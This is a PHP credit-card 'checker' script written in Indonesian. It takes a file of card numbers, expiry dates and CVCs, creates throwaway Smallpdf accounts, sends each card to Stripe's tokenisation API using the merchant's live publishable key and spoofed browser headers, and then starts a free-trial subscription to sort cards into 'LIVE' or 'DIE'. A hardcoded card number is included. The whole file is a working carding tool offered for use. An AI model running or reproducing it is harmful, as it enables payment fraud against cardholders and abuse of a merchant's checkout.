<?php
/*  
   	Created by Alif Dzikri (Jeinel Cannine)
	ptmiskin pride ~ 2019
	RECODE TIDAK MEMBUAT MU MENJADI CODER
 */
error_reporting(0);
$cc = "5449271026747993|03|20|413";

echo "\r CHECKER CC CHARGE $0 \n Created By Alip Dzikri \n \n ";
$i = 0;
$listcode = $argv[1];
$codelistlist = file_get_contents($listcode);
$code_list_array = file($listcode);
$code = explode(PHP_EOL, $codelistlist);
$count = count($code);
echo "Total Ada : $count CC Sob, Gass \n";
while($i < $count) {
$regis = regis();
$jsregis = json_decode($regis, true);
$token = $jsregis[data][token];
$a = explode("|", $code[$i]); 


$cek = cek($cc,$a);
$jscek = json_decode($cek, true);

if($jscek[error][code] == "incorrect_number"){
echo "\r".$jscek[error][message]." | $a[0]|$a[1]|$a[2]|$a[3] \n";
} else if($jscek[status] == "chargeable"){
$valid = valid($id,$token);

		echo "\r $a[0]|$a[1]|$a[2]|$a[3] | ".$jscek[card][country]." | ";
		$id = $jscek[id];
$jsvalid = json_decode($valid, true);
if($jsvalid[success] == true){
	echo "\033[32m LIVE \033[0m \n";
		} else {
			echo "\033[31m DIE \033[0m |  $jsvalid[error] \n";
			}
			}	$i++;
			}
function cek($cc,$a){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=".$a[0]."&card[cvc]=".$a[3]."&card[exp_month]=".$a[1]."&card[exp_year]=".$a[2]."&guid=ca9c2969-71d6-4d4d-bac7-d332210df113&muid=705ba916-5268-44d9-a1a1-478c0c9c0e12&sid=43394ac7-7c13-4464-abec-a5614ebf0a80&pasted_fields=number&payment_user_agent=stripe.js%2F1bc96eb9%3B+stripe-js-v3%2F1bc96eb9&referrer=https%3A%2F%2Fsmallpdf.com%2Fid%2Fpro&key=pk_live_Kp0AsDvplyh8MP5OUJua22kU");
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Referer: https://js.stripe.com/v3/controller-643ed39d87450905f4f5b04bb387bb70.html';
$headers[] = 'Accept-Language: id-ID,id';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
return $result;
}
function valid($id,$token){
	$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pro.smallpdf.com/pro/subscription');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"planId":"desktop-monthly-usd","couponCode":null,"address":{"phoneNumber":"+86","firstName":null,"lastName":null,"billingEmail":null,"billCompany":false,"company":null,"vatNumber":null,"streetAddress":null,"locality":null,"postalCode":null,"countryCodeAlpha2":"ID"},"payment":{"type":"creditcard","provider":"stripe","source":"'.$id.'","nonce":""},"trialPeriod":true,"trialDuration":"14","trialDurationUnit":"day","freeTrialSeries":"free_trial_started_variant_b"}');
$headers = array();
$headers[] = 'Origin: https://smallpdf.com';
$headers[] = 'Authorization: Bearer '.$token.'';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; RaZer MAX 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Referer: https://smallpdf.com/id/pro';
$headers[] = 'Accept-Language: id-ID,id';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
return $result;
}
function regis(){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://pro.smallpdf.com/pro/account');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"email\":\"dziunincode69+q".rand(1000,9999)."@gmail.com\",\"password\":\"saninkicker123\",\"desktop_user\":false,\"desktop_downloaded\":false,\"onboarding_series\":\"off\"}");
$headers = array();
$headers[] = 'Origin: https://smallpdf.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36';
$headers[] = 'Content-Type: text/plain;charset=UTF-8';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Referer: https://smallpdf.com/id';
$headers[] = 'Accept-Language: id-ID,id';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
return $result;
}



